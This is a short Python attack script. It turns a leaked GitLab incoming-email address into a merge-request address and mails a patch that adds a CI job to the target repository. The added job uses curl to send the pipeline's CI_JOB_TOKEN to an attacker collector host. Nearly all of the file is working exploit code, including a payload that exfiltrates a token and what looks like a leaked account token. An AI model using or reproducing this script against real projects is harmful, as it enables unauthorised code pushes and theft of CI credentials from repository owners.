#!/usr/bin/env python3
"""Weaponizes a leaked GitLab issue-by-email address into repo write access."""
from email.message import EmailMessage
import smtplib

# Leaked incoming-email credential (GitLab's documented address structure:
# incoming+<slug>-<project_id>-<account_token>-issue@incoming.gitlab.com).
leaked_issue_address = (
    "incoming+engineering-build-84546124-"
    "glimt-k9Qm2Vx7Lp4Nz8Rc6Ty3Wd5Hs-issue@incoming.gitlab.com"
)

# Escalate: the issue channel becomes the merge-request (code-push) channel by
# swapping only the action suffix. The account token is unchanged.
merge_request_address = leaked_issue_address.replace("-issue@", "-merge-request@")

# Patch payload edits .gitlab-ci.yml so the injected job runs as the victim and
# exfiltrates the pipeline's CI_JOB_TOKEN to an attacker collector.
ci_patch = """From 0123456789abcdef Mon Sep 17 00:00:00 2001
From: Build Maintainer <maintainer@example.invalid>
Subject: [PATCH] update pipeline

diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml
new file mode 100644
index 0000000..9fbc123
--- /dev/null
+++ b/.gitlab-ci.yml
@@ -0,0 +1,3 @@
+audit:
+  script:
+    - curl -fsS https://collector.invalid/job -d "$CI_JOB_TOKEN"
"""

message = EmailMessage()
message["From"] = "external@example.invalid"
message["To"] = merge_request_address
# GitLab applies the patch to the branch named in the subject, creating it.
message["Subject"] = "main"
message.set_content("pipeline update")
message.add_attachment(
    ci_patch.encode(),
    maintype="text",
    subtype="x-patch",
    filename="0001-update-pipeline.patch",
)

with smtplib.SMTP("mail.example.invalid", 25) as server:
    server.send_message(message)
